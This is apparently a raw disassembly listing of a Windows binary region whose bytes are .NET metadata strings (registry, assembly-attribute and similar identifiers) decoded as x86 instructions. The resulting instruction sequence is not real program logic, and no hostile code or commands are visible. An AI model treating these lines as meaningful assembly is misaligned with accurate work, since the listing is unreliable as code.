  40429d:	ins    BYTE PTR es:[edi],dx
  40429e:	fs gs jb 0x4042a2
  4042a2:	push   eax
  4042a3:	jb     0x404314
  4042a5:	fs jne 0x40430b
  4042a8:	je     0x4042f6
  4042aa:	imul   esp,DWORD PTR [ebx+0x65],0x4665736e
  4042b1:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x646f7250
  4042b9:	jne    0x40431e
  4042bb:	je     0x404312
  4042bd:	jo     0x404323
  4042bf:	popa   
  4042c0:	je     0x404327
  4042c2:	inc    ebx
  4042c3:	popa   
  4042c4:	je     0x40432b
  4042c6:	outs   dx,DWORD PTR ds:[si]
  4042c8:	jb     0x404343
  4042ca:	add    BYTE PTR [ebx+0x71],dl
  4042cd:	ins    BYTE PTR es:[edi],dx
  4042ce:	push   eax
  4042cf:	jb     0x404340
  4042d1:	fs jne 0x404337
  4042d4:	je     0x40431c
  4042d6:	popa   
  4042d7:	ins    DWORD PTR es:[edi],dx
  4042d8:	imul   ebp,DWORD PTR [ecx+edi*2+0x43],0x65646f
  4042e0:	push   eax
  4042e1:	jb     0x404352
  4042e3:	fs jne 0x404349
  4042e6:	je     0x40432c
  4042e8:	imul   esi,DWORD PTR [ebx+0x63],0x7265766f
  4042ef:	jns    0x40433a
  4042f1:	add    BYTE PTR fs:[ebx+0x71],dl
  4042f5:	ins    BYTE PTR es:[edi],dx
  4042f6:	dec    ecx
  4042f7:	outs   dx,BYTE PTR ds:[esi]
  4042f8:	jae    0x40436e
  4042fa:	popa   
  4042fb:	outs   dx,BYTE PTR ds:[esi]
  4042fc:	arpl   WORD PTR [ebp+0x49],sp
  4042ff:	inc    esp
  404300:	push   eax
  404301:	jb     0x404368
  404303:	imul   di,WORD PTR [eax+0x0],0x7341
  404309:	dec    ecx
  40430a:	outs   dx,BYTE PTR ds:[esi]
  40430b:	jae    0x404381
  40430d:	popa   
  40430e:	outs   dx,BYTE PTR ds:[esi]
  40430f:	arpl   WORD PTR [ebp+0x49],sp
  404312:	inc    esp
  404313:	push   eax
  404314:	jb     0x40437b
  404316:	imul   di,WORD PTR [eax+0x0],0x7352
  40431c:	dec    ecx
  40431d:	outs   dx,BYTE PTR ds:[esi]
  40431e:	jae    0x404394
  404320:	popa   
  404321:	outs   dx,BYTE PTR ds:[esi]
  404322:	arpl   WORD PTR [ebp+0x49],sp
  404325:	inc    esp
  404326:	push   eax
  404327:	jb     0x40438e
  404329:	imul   di,WORD PTR [eax+0x0],0x614d
  40432f:	js     0x40437e
  404331:	popa   
  404332:	imul   ebp,DWORD PTR [esi+0x74],0x6e616e65
  404339:	arpl   WORD PTR [ebp+0x56],sp
  40433c:	gs jb  0x4043b2
  40433f:	imul   ebp,DWORD PTR [edi+0x6e],0x61766500
  404346:	ins    BYTE PTR es:[edi],dx
  404347:	push   esp
  404348:	imul   ebp,DWORD PTR [ebp+0x65],0x626d6f42
  40434f:	push   esi
  404350:	popa   
  404351:	ins    BYTE PTR es:[edi],dx
  404352:	jne    0x4043b9
  404354:	add    BYTE PTR [ebx+0x75],ah
  404357:	jb     0x4043cb
  404359:	outs   dx,BYTE PTR gs:[esi]
  40435b:	je     0x4043af
  40435d:	gs ins BYTE PTR es:[edi],dx
  40435f:	gs popa 
  404361:	jae    0x4043c8
  404363:	push   esp
  404364:	imul   ebp,DWORD PTR [ebp+0x65],0x626d6f42
  40436b:	push   esi
  40436c:	popa   
  40436d:	ins    BYTE PTR es:[edi],dx
  40436e:	jne    0x4043d5
  404370:	add    BYTE PTR [edi+0x65],dl
  404373:	jb     0x4043ba
  404375:	jbe    0x4043dc
  404377:	outs   dx,BYTE PTR ds:[esi]
  404378:	je     0x4043c8
  40437a:	popa   
  40437b:	ins    DWORD PTR es:[edi],dx
  40437c:	gs push ebx
  40437e:	gs je  0x4043f6
  404381:	jo     0x4043d0
  404383:	jae    0x4043ee
  404385:	add    BYTE PTR [edi+0x65],dl
  404388:	jb     0x4043cf
  40438a:	jbe    0x4043f1
  40438c:	outs   dx,BYTE PTR ds:[esi]
  40438d:	je     0x4043dd
  40438f:	popa   
  404390:	ins    DWORD PTR es:[edi],dx
  404391:	gs push ebx
  404393:	gs je  0x40440b
  404396:	jo     0x4043db
  404398:	outs   dx,DWORD PTR ds:[esi]
  404399:	outs   dx,BYTE PTR ds:[esi]
  40439a:	imul   sp,WORD PTR [edi+0x0],0x5341
  4043a0:	push   ebp
  4043a1:	jae    0x404404
  4043a3:	addr16 gs dec ebp
  4043a6:	gs je  0x40441b
  4043a9:	imul   esp,DWORD PTR [ebx+0x73],0x656c6f52
  4043b0:	inc    edi
  4043b1:	jne    0x40441c
  4043b3:	fs push ebx
  4043b5:	je     0x404429
  4043b7:	imul   ebp,DWORD PTR [esi+0x67],0x72655600
  4043be:	jae    0x404429
  4043c0:	outs   dx,DWORD PTR ds:[esi]
  4043c1:	outs   dx,BYTE PTR ds:[esi]
  4043c2:	inc    edx
  4043c3:	dec    ecx
  4043c4:	inc    esp
  4043c5:	push   ebx
  4043c6:	dec    eax
  4043c7:	gs ins BYTE PTR es:[edi],dx
  4043c9:	jo     0x404419
  4043cb:	popa   
  4043cc:	ins    DWORD PTR es:[edi],dx
  4043cd:	gs jae 0x404440
  4043d0:	popa   
  4043d1:	arpl   WORD PTR [ebp+0x0],sp
  4043d4:	push   esi
  4043d5:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  4043dc:	jne    0x404442
  4043de:	imul   ebp,DWORD PTR [edi+0x53],0x6c6c6568
  4043e5:	push   esi
  4043e6:	gs jb  0x40445c
  4043e9:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  4043f0:	pop    edi
  4043f1:	push   esi
  4043f2:	gs jb  0x404468
  4043f5:	imul   ebp,DWORD PTR [edi+0x6e],0x706c6548
  4043fc:	dec    esi
  4043fd:	popa   
  4043fe:	ins    DWORD PTR es:[edi],dx
  4043ff:	gs jae 0x404472
  404402:	popa   
  404403:	arpl   WORD PTR [ebp+0x0],sp
  404406:	push   esi
  404407:	gs jb  0x40447d
  40440a:	imul   ebp,DWORD PTR [edi+0x6e],0x706c6548
  404411:	dec    esi
  404412:	popa   
  404413:	ins    DWORD PTR es:[edi],dx
  404414:	gs jae 0x404487
  404417:	popa   
  404418:	arpl   WORD PTR [ebp+0x0],sp
  40441b:	popa   
  40441c:	jb     0x404485
  40441e:	jae    0x404420
  404420:	arpl   WORD PTR [edi+0x6e],bp
  404423:	imul   sp,WORD PTR [edi+0x0],0x7265
  404429:	jb     0x40449a
  40442b:	jb     0x40442d
  40442d:	gs jb  0x4044a2
  404430:	outs   dx,DWORD PTR ds:[esi]
  404431:	jb     0x404485
  404433:	arpl   WORD PTR gs:[edi+0x72],bp
  404437:	add    BYTE PTR fs:[esi+0x61],dh
  40443b:	ins    BYTE PTR es:[edi],dx
  40443c:	jne    0x4044a3
  40443e:	add    BYTE PTR [ecx+ebp*2+0x6e],ch
  404442:	gs dec esi
  404444:	jne    0x4044b3
  404446:	bound  esp,QWORD PTR [ebp+0x72]
  404449:	add    BYTE PTR [ecx+ebp*2+0x6e],ch
  40444d:	add    BYTE PTR gs:[ebp+0x78],ah
  404451:	arpl   WORD PTR [ebp+0x70],sp
  404454:	je     0x4044bf
  404456:	outs   dx,DWORD PTR ds:[esi]
  404457:	outs   dx,BYTE PTR ds:[esi]
  404458:	inc    ebx
  404459:	push   0x6e6961
  40445e:	imul   esp,DWORD PTR [ebp+0x79],0x0
  404462:	popa   
  404463:	jb     0x4044cc
  404465:	xor    BYTE PTR [eax],al
  404467:	popa   
  404468:	jb     0x4044d1
  40446a:	xor    DWORD PTR [eax],eax
  40446c:	popa   
  40446d:	jb     0x4044d6
  40446f:	xor    al,BYTE PTR [eax]
  404471:	push   ebx
  404472:	jns    0x4044e7
  404474:	je     0x4044db
  404476:	ins    DWORD PTR es:[edi],dx
  404477:	cs push edx
  404479:	jne    0x4044e9
  40447b:	je     0x4044e6
  40447d:	ins    DWORD PTR es:[edi],dx
  40447e:	gs cs dec ecx
  404481:	outs   dx,BYTE PTR ds:[esi]
  404482:	je     0x4044e9
  404484:	jb     0x4044f5
  404486:	jo     0x4044db
  404488:	gs jb  0x404501
  40448b:	imul   esp,DWORD PTR [ebx+0x65],0x6f430073
  404492:	ins    DWORD PTR es:[edi],dx
  404493:	push   esi
  404494:	imul   esi,DWORD PTR [ebx+0x69],0x41656c62
  40449b:	je     0x404511
  40449d:	jb     0x404508
  40449f:	bound  esi,QWORD PTR [ebp+0x74]
  4044a2:	add    BYTE PTR gs:[ebx+0x79],dl
  4044a6:	jae    0x40451c
  4044a8:	gs ins DWORD PTR es:[edi],dx
  4044aa:	cs push edx
  4044ac:	gs data16 ins BYTE PTR es:[edi],dx
  4044af:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4044b4:	outs   dx,BYTE PTR ds:[esi]
  4044b5:	add    BYTE PTR [ecx+0x73],al
  4044b8:	jae    0x40451f
  4044ba:	ins    DWORD PTR es:[edi],dx
  4044bb:	bound  ebp,QWORD PTR [ecx+edi*2+0x56]
  4044bf:	gs jb  0x404535
  4044c2:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  4044c9:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  4044d0:	jae    0x404545
  4044d2:	gs ins DWORD PTR es:[edi],dx
  4044d4:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  4044d8:	jb     0x404549
  4044da:	fs jne 0x404540
  4044dd:	je     0x404520
  4044df:	je     0x404555
  4044e1:	jb     0x40454c
  4044e3:	bound  esi,QWORD PTR [ebp+0x74]
  4044e6:	add    BYTE PTR gs:[ecx+0x73],al
  4044ea:	jae    0x404551
  4044ec:	ins    DWORD PTR es:[edi],dx
  4044ed:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  4044f1:	outs   dx,DWORD PTR ds:[esi]
  4044f2:	jo     0x40456d
  4044f4:	jb     0x40455f
  4044f6:	addr16 push 0x74744174
  4044fc:	jb     0x404567
  4044fe:	bound  esi,QWORD PTR [ebp+0x74]
  404501:	add    BYTE PTR gs:[ecx+0x73],al
  404505:	jae    0x40456c
  404507:	ins    DWORD PTR es:[edi],dx
  404508:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  40450c:	outs   dx,DWORD PTR ds:[esi]
  40450d:	ins    DWORD PTR es:[edi],dx
  40450e:	jo     0x404571
  404510:	outs   dx,BYTE PTR ds:[esi]
  404511:	jns    0x404554
  404513:	je     0x404589
  404515:	jb     0x404580
  404517:	bound  esi,QWORD PTR [ebp+0x74]
  40451a:	add    BYTE PTR gs:[ecx+0x73],al
  40451e:	jae    0x404585
  404520:	ins    DWORD PTR es:[edi],dx
  404521:	bound  ebp,QWORD PTR [ecx+edi*2+0x46]
  404525:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  40452d:	outs   dx,DWORD PTR ds:[esi]
  40452e:	outs   dx,BYTE PTR ds:[esi]
  40452f:	inc    ecx
  404530:	je     0x4045a6
  404532:	jb     0x40459d
  404534:	bound  esi,QWORD PTR [ebp+0x74]
  404537:	add    BYTE PTR gs:[ecx+0x73],al
  40453b:	jae    0x4045a2
  40453d:	ins    DWORD PTR es:[edi],dx
  40453e:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  404542:	outs   dx,BYTE PTR ds:[esi]
  404543:	outs   dx,WORD PTR ds:[esi]
  404545:	jb     0x4045b4
  404547:	popa   
  404548:	je     0x4045b3
  40454a:	outs   dx,DWORD PTR ds:[esi]
  40454b:	outs   dx,BYTE PTR ds:[esi]
  40454c:	popa   
  40454d:	ins    BYTE PTR es:[edi],dx
  40454e:	push   esi
  40454f:	gs jb  0x4045c5
  404552:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  404559:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  404560:	jae    0x4045d5
  404562:	gs ins DWORD PTR es:[edi],dx
  404564:	bound  ebp,QWORD PTR [ecx+edi*2+0x4b]
  404568:	gs jns 0x4045b1
  40456b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  404573:	bound  esi,QWORD PTR [ebp+0x74]
  404576:	add    BYTE PTR gs:[ecx+0x73],al
  40457a:	jae    0x4045e1
  40457c:	ins    DWORD PTR es:[edi],dx
  40457d:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  404581:	gs ins BYTE PTR es:[edi],dx
  404583:	popa   
  404584:	jns    0x4045d9
  404586:	imul   esp,DWORD PTR [edi+0x6e],0x72747441
  40458d:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  404594:	jae    0x404609
  404596:	gs ins DWORD PTR es:[edi],dx
  404598:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  40459c:	jb     0x4045ff
  40459e:	fs gs ins DWORD PTR es:[edi],dx
  4045a1:	popa   
  4045a2:	jb     0x40460f
  4045a4:	inc    ecx
  4045a5:	je     0x40461b
  4045a7:	jb     0x404612
  4045a9:	bound  esi,QWORD PTR [ebp+0x74]
  4045ac:	add    BYTE PTR gs:[ecx+0x73],al
  4045b0:	jae    0x404617
  4045b2:	ins    DWORD PTR es:[edi],dx
  4045b3:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  4045b7:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x72747441
  4045bf:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  4045c6:	jae    0x40463b
  4045c8:	gs ins DWORD PTR es:[edi],dx
  4045ca:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  4045ce:	gs jae 0x404634
  4045d1:	jb     0x40463c
  4045d3:	jo     0x404649
  4045d5:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  4045dc:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  4045e3:	jae    0x404658
  4045e5:	gs ins DWORD PTR es:[edi],dx
  4045e7:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  4045eb:	jne    0x404659
  4045ed:	je     0x404664
  4045ef:	jb     0x404656
  4045f1:	inc    ecx
  4045f2:	je     0x404668
  4045f4:	jb     0x40465f
  4045f6:	bound  esi,QWORD PTR [ebp+0x74]
  4045f9:	add    BYTE PTR gs:[esi+0x65],cl
  4045fd:	jne    0x404673
  4045ff:	jb     0x404662
  404601:	ins    BYTE PTR es:[edi],dx
  404602:	push   edx
  404603:	gs jae 0x404675
  404606:	jne    0x40467a
  404608:	arpl   WORD PTR [ebp+0x73],sp
  40460b:	dec    esp
  40460c:	popa   
  40460d:	outs   dx,BYTE PTR ds:[esi]
  40460e:	addr16 jne 0x404672
  404611:	addr16 gs inc ecx
  404614:	je     0x40468a
  404616:	jb     0x404681
  404618:	bound  esi,QWORD PTR [ebp+0x74]
  40461b:	add    BYTE PTR gs:[ecx+0x73],al
  40461f:	jae    0x404686
  404621:	ins    DWORD PTR es:[edi],dx
  404622:	bound  ebp,QWORD PTR [ecx+edi*2+0x4b]
  404626:	gs jns 0x404677
  404629:	popa   
  40462a:	ins    DWORD PTR es:[edi],dx
  40462b:	gs inc ecx
  40462d:	je     0x4046a3
  40462f:	jb     0x40469a
  404631:	bound  esi,QWORD PTR [ebp+0x74]
  404634:	add    BYTE PTR gs:[ebx+0x79],dl
  404638:	jae    0x4046ae
  40463a:	gs ins DWORD PTR es:[edi],dx
  40463c:	cs inc esp
  40463e:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  404645:	imul   esp,DWORD PTR [ebx+0x73],0x62654400
  40464c:	jne    0x4046b5
  40464e:	addr16 popa 
  404650:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  404654:	je     0x4046ca
  404656:	jb     0x4046c1
  404658:	bound  esi,QWORD PTR [ebp+0x74]
  40465b:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  404660:	jne    0x4046c9
  404662:	imul   ebp,DWORD PTR [bp+0x67],0x65646f4d
  40466a:	jae    0x40466c
  40466c:	push   ebx
  40466d:	jns    0x4046e2
  40466f:	je     0x4046d6
  404671:	ins    DWORD PTR es:[edi],dx
  404672:	cs push edx
  404674:	jne    0x4046e4
  404676:	je     0x4046e1
  404678:	ins    DWORD PTR es:[edi],dx
  404679:	gs cs inc ebx
  40467c:	outs   dx,DWORD PTR ds:[esi]
  40467d:	ins    DWORD PTR es:[edi],dx
  40467e:	jo     0x4046e9
  404680:	ins    BYTE PTR es:[edi],dx
  404681:	gs jb  0x4046d7
  404684:	gs jb  0x4046fd
  404687:	imul   esp,DWORD PTR [ebx+0x65],0x6f430073
  40468e:	ins    DWORD PTR es:[edi],dx
  40468f:	jo     0x4046fa
  404691:	ins    BYTE PTR es:[edi],dx
  404692:	popa   
  404693:	je     0x4046fe
  404695:	outs   dx,DWORD PTR ds:[esi]
  404696:	outs   dx,BYTE PTR ds:[esi]
  404697:	push   edx
  404698:	gs ins BYTE PTR es:[edi],dx
  40469a:	popa   
  40469b:	js     0x4046fe
  40469d:	je     0x404708
  40469f:	outs   dx,DWORD PTR ds:[esi]
  4046a0:	outs   dx,BYTE PTR ds:[esi]
  4046a1:	jae    0x4046e4
  4046a3:	je     0x404719
  4046a5:	jb     0x404710
  4046a7:	bound  esi,QWORD PTR [ebp+0x74]
  4046aa:	add    BYTE PTR gs:[edx+0x75],dl
  4046ae:	outs   dx,BYTE PTR ds:[esi]
  4046af:	je     0x40471a
  4046b1:	ins    DWORD PTR es:[edi],dx
  4046b2:	gs inc ebx
  4046b4:	outs   dx,DWORD PTR ds:[esi]
  4046b5:	ins    DWORD PTR es:[edi],dx
  4046b6:	jo     0x404719
  4046b8:	je     0x404723
  4046ba:	bound  ebp,QWORD PTR [ecx+0x6c]
  4046bd:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x69727474
  4046c5:	bound  esi,QWORD PTR [ebp+0x74]
  4046c8:	add    BYTE PTR gs:[ebx+0x51],dl
  4046cc:	dec    esp
  4046cd:	push   eax
  4046ce:	push   ebx
  4046cf:	add    BYTE PTR [edi+ebp*2+0x61],cl
  4046d3:	fs gs jb 0x404726
  4046d7:	jo     0x40474d
  4046d9:	imul   ebp,DWORD PTR [ebp+0x69],0x6974617a
  4046e0:	outs   dx,DWORD PTR ds:[esi]
  4046e1:	outs   dx,BYTE PTR ds:[esi]
  4046e2:	inc    ecx
  4046e3:	je     0x404759
  4046e5:	jb     0x404750
  4046e7:	bound  esi,QWORD PTR [ebp+0x74]
  4046ea:	add    BYTE PTR gs:[edi+ebp*2+0x61],cl
  4046ef:	fs gs jb 0x404742
  4046f3:	jo     0x404769
  4046f5:	imul   ebp,DWORD PTR [ebp+0x69],0x6974617a
  4046fc:	outs   dx,DWORD PTR ds:[esi]
  4046fd:	outs   dx,BYTE PTR ds:[esi]
  4046fe:	add    BYTE PTR [ebp+0x6e],al
  404701:	jbe    0x40476c
  404703:	jb     0x404774
  404705:	outs   dx,BYTE PTR ds:[esi]
  404706:	ins    DWORD PTR es:[edi],dx
  404707:	outs   dx,BYTE PTR gs:[esi]
  404709:	je     0x40470b
  40470b:	inc    ebp
  40470c:	outs   dx,BYTE PTR ds:[esi]
  40470d:	jbe    0x404778
  40470f:	jb     0x404780
  404711:	outs   dx,BYTE PTR ds:[esi]
  404712:	ins    DWORD PTR es:[edi],dx
  404713:	outs   dx,BYTE PTR gs:[esi]
  404715:	je     0x40476d
  404717:	popa   
  404718:	jb     0x404783
  40471a:	popa   
  40471b:	bound  ebp,QWORD PTR [ebp+eiz*2+0x54]
  40471f:	popa   
  404720:	jb     0x404789
  404722:	gs je  0x404725
  404725:	inc    edi
  404726:	gs je  0x40476e
  404729:	outs   dx,BYTE PTR ds:[esi]
  40472a:	jbe    0x404795
  40472c:	jb     0x40479d
  40472e:	outs   dx,BYTE PTR ds:[esi]
  40472f:	ins    DWORD PTR es:[edi],dx
  404730:	outs   dx,BYTE PTR gs:[esi]
  404732:	je     0x40478a
  404734:	popa   
  404735:	jb     0x4047a0
  404737:	popa   
  404738:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  40473c:	push   ebx
  40473d:	je     0x4047b1
  40473f:	imul   ebp,DWORD PTR [esi+0x67],0x72745300
  404746:	imul   ebp,DWORD PTR [esi+0x67],0x706d6f43
  40474d:	popa   
  40474e:	jb     0x4047b9
  404750:	jae    0x4047c1
  404752:	outs   dx,BYTE PTR ds:[esi]
  404753:	add    BYTE PTR [ebx+0x6f],al
  404756:	ins    DWORD PTR es:[edi],dx
  404757:	jo     0x4047ba
  404759:	jb     0x4047c0
  40475b:	add    BYTE PTR [ebx+0x65],dl
  40475e:	je     0x4047a5
  404760:	outs   dx,BYTE PTR ds:[esi]
  404761:	jbe    0x4047cc
  404763:	jb     0x4047d4
  404765:	outs   dx,BYTE PTR ds:[esi]
  404766:	ins    DWORD PTR es:[edi],dx
  404767:	outs   dx,BYTE PTR gs:[esi]
  404769:	je     0x4047c1
  40476b:	popa   
  40476c:	jb     0x4047d7
  40476e:	popa   
  40476f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  404773:	dec    ebp
  404774:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40477b:	je     0x4047ab
  40477d:	push   edi
  40477e:	imul   ebp,DWORD PTR [esi+0x33],0x65520032
  404785:	imul   esi,DWORD PTR [bp+di+0x74],0x52007972
  40478d:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x654b7972
  404796:	jns    0x404798
  404798:	dec    esp
  404799:	outs   dx,DWORD PTR ds:[esi]
  40479a:	arpl   WORD PTR [ecx+0x6c],sp
  40479d:	dec    ebp
  40479e:	popa   
  40479f:	arpl   WORD PTR [eax+0x69],bp
  4047a2:	outs   dx,BYTE PTR ds:[esi]
  4047a3:	add    BYTE PTR gs:[edi+0x70],cl
  4047a7:	outs   dx,BYTE PTR gs:[esi]
  4047a9:	push   ebx
  4047aa:	jne    0x40480e
  4047ac:	dec    ebx
  4047ad:	gs jns 0x4047b0
  4047b0:	inc    edi
  4047b1:	gs je  0x40480a
  4047b4:	popa   
  4047b5:	ins    BYTE PTR es:[edi],dx
  4047b6:	jne    0x40481d
  4047b8:	add    BYTE PTR [ecx+0x44],cl
  4047bb:	imul   esi,DWORD PTR [ebx+0x70],0x6261736f
  4047c2:	ins    BYTE PTR es:[edi],dx
  4047c3:	add    BYTE PTR gs:[ecx+ebp*2+0x73],al
  4047c8:	jo     0x404839
  4047ca:	jae    0x404831
  4047cc:	add    BYTE PTR [edx+0x75],dl
  4047cf:	outs   dx,BYTE PTR ds:[esi]
  4047d0:	jae    0x404842
  4047d2:	popa   
  4047d3:	arpl   WORD PTR [ebp+0x46],sp
  4047d6:	popa   
  4047d7:	arpl   WORD PTR [edi+ebp*2+0x72],si
  4047db:	jns    0x4047dd
  4047dd:	push   edx
  4047de:	jne    0x40484e
  4047e0:	jae    0x404852
  4047e2:	popa   
  4047e3:	arpl   WORD PTR [ebp+0x0],sp
  4047e6:	inc    ebx
  4047e7:	jb     0x40484e
  4047e9:	popa   
  4047ea:	je     0x404851
  4047ec:	push   edx
  4047ed:	jne    0x40485d
  4047ef:	jae    0x404861
  4047f1:	popa   
  4047f2:	arpl   WORD PTR [ebp+0x0],sp
  4047f5:	addr16 gs je 0x404858
  4047f9:	push   edx
  4047fa:	jne    0x40486a
  4047fc:	jae    0x40486e
  4047fe:	popa   
  4047ff:	arpl   WORD PTR [ebp+0x43],sp
  404802:	outs   dx,DWORD PTR ds:[esi]
  404803:	outs   dx,BYTE PTR ds:[esi]
  404804:	imul   sp,WORD PTR [edi+0x75],0x6172
  40480a:	je     0x404875
  40480c:	outs   dx,DWORD PTR ds:[esi]
  40480d:	outs   dx,BYTE PTR ds:[esi]
  40480e:	add    BYTE PTR [edx+0x75],dl
  404811:	outs   dx,BYTE PTR ds:[esi]
  404812:	jae    0x404884
  404814:	popa   
  404815:	arpl   WORD PTR [ebp+0x43],sp
  404818:	outs   dx,DWORD PTR ds:[esi]
  404819:	outs   dx,BYTE PTR ds:[esi]
  40481a:	imul   sp,WORD PTR [edi+0x75],0x6172
  404820:	je     0x40488b
  404822:	outs   dx,DWORD PTR ds:[esi]
  404823:	outs   dx,BYTE PTR ds:[esi]
  404824:	inc    ebp
  404825:	outs   dx,BYTE PTR ds:[esi]
  404826:	je     0x40489a
  404828:	jns    0x40486d
  40482a:	outs   dx,DWORD PTR ds:[esi]
  40482b:	ins    BYTE PTR es:[edi],dx
  40482c:	ins    BYTE PTR es:[edi],dx
  40482d:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  404832:	outs   dx,BYTE PTR ds:[esi]
  404833:	pusha  
  404834:	xor    DWORD PTR [eax],eax
  404836:	push   ebx
  404837:	arpl   WORD PTR [edx+0x69],si
  40483a:	jo     0x4048b0
  40483c:	inc    ebx
  40483d:	outs   dx,DWORD PTR ds:[esi]
  40483e:	outs   dx,BYTE PTR ds:[esi]
  40483f:	imul   sp,WORD PTR [edi+0x75],0x6172
  404845:	je     0x4048b0
  404847:	outs   dx,DWORD PTR ds:[esi]
  404848:	outs   dx,BYTE PTR ds:[esi]
  404849:	inc    ebp
  40484a:	outs   dx,BYTE PTR ds:[esi]
  40484b:	je     0x4048bf
  40484d:	jns    0x40484f
  40484f:	addr16 gs je 0x4048b2
  404853:	dec    ecx
  404854:	outs   dx,BYTE PTR ds:[esi]
  404855:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x617a696c
  40485d:	je     0x4048c8
  40485f:	outs   dx,DWORD PTR ds:[esi]
  404860:	outs   dx,BYTE PTR ds:[esi]
  404861:	push   ebx
  404862:	arpl   WORD PTR [edx+0x69],si
  404865:	jo     0x4048db
  404867:	jae    0x404869
  404869:	addr16 gs je 0x4048cc
  40486d:	dec    ecx
  40486e:	outs   dx,BYTE PTR ds:[esi]
  40486f:	jbe    0x4048d2
  404871:	jb     0x4048dc
  404873:	popa   
  404874:	outs   dx,BYTE PTR ds:[esi]
  404875:	je     0x4048ba
  404877:	jne    0x4048e5
  404879:	je     0x4048f0
  40487b:	jb     0x4048e2
  40487d:	add    BYTE PTR [ecx+0x46],cl
  404880:	outs   dx,DWORD PTR ds:[esi]
  404881:	jb     0x4048f0
  404883:	popa   
  404884:	je     0x4048d6
  404886:	jb     0x4048f7
  404888:	jbe    0x4048f3
  40488a:	fs gs jb 0x40488e
  40488e:	inc    esi
  40488f:	outs   dx,DWORD PTR ds:[esi]
  404890:	jb     0x4048ff
  404892:	popa   
  404893:	je     0x404895
  404895:	inc    ecx
  404896:	jo     0x404908
  404898:	outs   dx,BYTE PTR gs:[esi]
  40489a:	add    BYTE PTR fs:[ebx+0x6f],al
  40489e:	outs   dx,BYTE PTR ds:[esi]
  40489f:	jae    0x404910
  4048a1:	ins    BYTE PTR es:[edi],dx
  4048a2:	add    BYTE PTR gs:[ebx+0x79],dl
  4048a6:	jae    0x40491c
  4048a8:	gs ins DWORD PTR es:[edi],dx
  4048aa:	cs dec ecx
  4048ac:	dec    edi
  4048ad:	add    BYTE PTR [ebp+eiz*2+0x78],dl
  4048b1:	je     0x40490a
  4048b3:	jb     0x40491e
  4048b5:	je     0x40491c
  4048b7:	jb     0x4048b9
  4048b9:	addr16 gs je 0x40491c
  4048bd:	inc    ebp
  4048be:	jb     0x404932
  4048c0:	outs   dx,DWORD PTR ds:[esi]
  4048c1:	jb     0x4048c3
  4048c3:	inc    ebp
  4048c4:	js     0x404929
  4048c6:	gs jo  0x40493d
  4048c9:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  4048d0:	pop    edi
  4048d1:	dec    ebp
  4048d2:	gs jae 0x404948
  4048d5:	popa   
  4048d6:	add    BYTE PTR gs:[bx+0x72],dl
  4048db:	imul   esi,DWORD PTR [ebp+eiz*2+0x4c],0x656e69
  4048e3:	inc    ebp
  4048e4:	jno    0x40495b
  4048e6:	popa   
  4048e7:	ins    BYTE PTR es:[edi],dx
  4048e8:	jae    0x4048ea
  4048ea:	push   esp
  4048eb:	jns    0x40495d
  4048ed:	add    BYTE PTR gs:[edx+0x75],dl
  4048f1:	outs   dx,BYTE PTR ds:[esi]
  4048f2:	je     0x40495d
  4048f4:	ins    DWORD PTR es:[edi],dx
  4048f5:	gs push esp
  4048f7:	jns    0x404969
  4048f9:	gs dec eax
  4048fb:	popa   
  4048fc:	outs   dx,BYTE PTR ds:[esi]
  4048fd:	fs ins BYTE PTR es:[edi],dx
  4048ff:	add    BYTE PTR gs:[edi+0x65],al
  404903:	je     0x404959
  404905:	jns    0x404977
  404907:	gs inc esi
  404909:	jb     0x40497a
  40490b:	ins    DWORD PTR es:[edi],dx
  40490c:	dec    eax
  40490d:	popa   
  40490e:	outs   dx,BYTE PTR ds:[esi]
  40490f:	fs ins BYTE PTR es:[edi],dx
  404911:	add    BYTE PTR gs:[ecx+0x73],al
  404915:	jae    0x40497c
  404917:	ins    DWORD PTR es:[edi],dx
  404918:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  40491c:	addr16 gs je 0x40497f
  404920:	inc    ecx
  404921:	jae    0x404996
  404923:	gs ins DWORD PTR es:[edi],dx
  404925:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  404929:	inc    edi
  40492a:	gs je  0x404970
  40492d:	jne    0x4049a2
  40492f:	je     0x4049a0
  404931:	ins    DWORD PTR es:[edi],dx
  404932:	inc    ecx
  404933:	je     0x4049a9
  404935:	jb     0x4049a0
  404937:	bound  esi,QWORD PTR [ebp+0x74]
  40493a:	gs jae 0x40493d
  40493d:	addr16 gs je 0x4049a0
  404941:	push   esp
  404942:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x74656700
  40494a:	pop    edi
  40494b:	dec    ecx
  40494c:	outs   dx,BYTE PTR ds:[esi]
